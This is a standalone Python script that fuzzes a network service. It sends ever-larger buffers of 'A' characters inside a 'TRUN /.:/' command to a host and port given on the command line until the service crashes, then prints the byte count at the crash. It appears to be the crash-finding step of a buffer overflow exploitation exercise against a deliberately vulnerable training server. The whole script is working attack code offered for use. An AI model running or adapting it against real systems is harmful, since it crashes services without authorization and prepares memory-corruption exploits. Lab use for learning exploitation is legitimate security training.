#!/usr/bin/env python3

import sys, socket
from datetime import datetime
from time import sleep

if len(sys.argv) != 3:
    print(f'Syntax: {sys.argv[0]} <hostname> <port>')
    exit(1)

hostname = sys.argv[1]
port = int(sys.argv[2])

try:
    host = socket.gethostbyname(hostname)
except socket.gaierror:
    print(f"Hostname could not be resolved: {hostname}")
    exit(1)
except socket.error:
    print(f"Could not connect to hostname: {hostname}")
    exit(1)

print("-" * 50)
print(f"Fuzzing against: {host}:{port}")
print(f"Time: {datetime.now()}")
print("-" * 50)

buff = ""
buff_len = 0

socket.setdefaulttimeout(1)

while True:
    try:
        buff += "A" * 100
        buff_len += 100
        print(f'Sending {buff_len} bytes...')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send((f"TRUN /.:/{buff}".encode()))
        s.close()
        sleep(1)
    except Exception as e:
        print(f"Exception: {e}")
        print(f'CRASHED AT {buff_len} BYTES')
        exit(0)

